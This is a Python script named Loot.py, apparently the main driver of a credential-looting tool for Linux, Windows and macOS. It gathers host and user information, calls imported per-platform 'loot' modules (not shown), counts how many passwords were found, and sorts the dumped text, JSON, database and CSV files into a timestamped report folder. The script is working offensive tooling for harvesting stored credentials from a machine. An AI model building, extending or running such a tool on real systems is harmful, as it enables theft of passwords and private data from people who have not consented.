# import libs
import os
import sys
import getpass
import platform
from datetime import datetime

# get linux distro
def linux_distro():
  try:
    return platform.linux_distribution()
  except:
    return "N/A"

# store report
reports = ''
sysInfo = ''
verbose = True
if len(sys.argv) > 0:
	arg1 = sys.argv
	if len(arg1) > 1:
		if arg1[1] == "-s": verbose = False
# load all OS info
OS_type = platform.system()
OS_mach = platform.machine()
OS_plat = platform.platform()
OS_vers = platform.version()
Mc_vers = platform.mac_ver()
OS_uname= platform.uname()
Lx_dist = linux_distro()
OS_user = getpass.getuser()
# add to sysInfo for full system report
sysInfo += str(OS_type) + '\n' + str(OS_mach) + '\n' + str(OS_plat) + '\n' + str(OS_vers) + '\n' + str(OS_user) + '\n'
aa = 0
while aa < len(OS_uname):
	if len(OS_uname[aa]) > 0: sysInfo += str(OS_uname[aa]) + '\n'
	aa += 1
# report directory will be date + time
dirName = datetime.now().strftime('%Y%m%d_%Hh%Mm%Ss')
# total amount of passwords found / total of modules
found = 0
total = 0

# show OS info
def showInfo():
	global reports
	reports += '_' * 32 + '\n'
	reports += '				|' + '\n'
	reports += ' - Loot.py (' + dirName + ')	|' + '\n'
	reports += ' - User:   ' + str(OS_user) + ' ' * (31 - 10 - len(str(OS_user))) + '|' + '\n'
	reports += '_' * 32 + '|\n'
# show initial info.
showInfo()

# create directory for this report
if not os.path.exists(dirName):
    os.makedirs(dirName)

# first we load more OS info
# then run loot modules ::)
try:
	sysname, nodename, release, version, machine = os.uname()
	sysinfo = {'os.sysname':sysname, 'os.hostname':nodename, 'os.version.number':release,
			   'os.version.string':version, 'os.arch':machine}
	sysInfo += sysname + '\n' + nodename + '\n' + release + '\n' + version + '\n' + machine	
except:
	sysname, nodename, release, version, machine = OS_uname[0],OS_uname[1],OS_vers,OS_uname[2],OS_uname[3]
reports += '\n -  System Info:\n'
reports += '[*] ' + OS_type + ' (' + OS_mach + ')' + '\n'
if OS_type == "Linux":
	from modsLin import linLoot
	reports += '[*] ' + str(Lx_dist[0]) + sysname + ' (' + release + ')\n'
	reports += linLoot(OS_user)
	total = 6 # total number modules (linux)
if OS_type == "Windows":
	from modsWin import winLoot 
	reports += '[*] ' + sysname + ' ' + version + ' (' + release + ')\n'
	reports += winLoot()
	total = 7 # total number modules (windows)
if OS_type == "Darwin":
	reports += '[*] ' + sysname + ' ' + platform.mac_ver()[0] + ' (' + release + ')\n'
	from modsMac import macLoot
	reports += macLoot(OS_user)
	total = 4 # total number modules (osx)

# move all files to report folder
def cleanFiles():
	global found
	# Text file dump
	for file in os.listdir("."):
		if file.endswith(".txt") or file.endswith(".json") or file.endswith(".db") or file.endswith(".csv"):
			if os.path.getsize(file) > 0:
				if OS_type == "Windows": os.rename(file, dirName + '\\' + file)
				if OS_type == "Linux" or OS_type == "Darwin": os.rename(file, dirName + '/' + file)
				if file[:2] == 'NS' and file == 'NS-1.txt': found += 1
				if file[:2] != 'NS' and file.endswith(".db") == False and file != 'report.txt': found += 1
			else: os.remove(file)

# move files at the end of script
cleanFiles()

# now write report file
reports += '\n -  Looted: [ ' + str(found) + ' / ' + str(total) + ' ]\n'
f = open('report.txt', 'w')
if len(reports) > 1: f.write(reports)
f.close()
# now write system file
f = open('system.txt', 'w')
if len(sysInfo) > 1: f.write(sysInfo)
f.close()

if OS_type == "Windows": 
	os.rename('report.txt', dirName + '\\' + 'report.txt')
	os.rename('system.txt', dirName + '\\' + 'system.txt')
if OS_type == "Linux" or OS_type == "Darwin": 
	os.rename('report.txt', dirName + '/' + 'report.txt')
	os.rename('system.txt', dirName + '/' + 'system.txt')

# at the end, if we are running verbose, print output
if verbose == True: print(reports)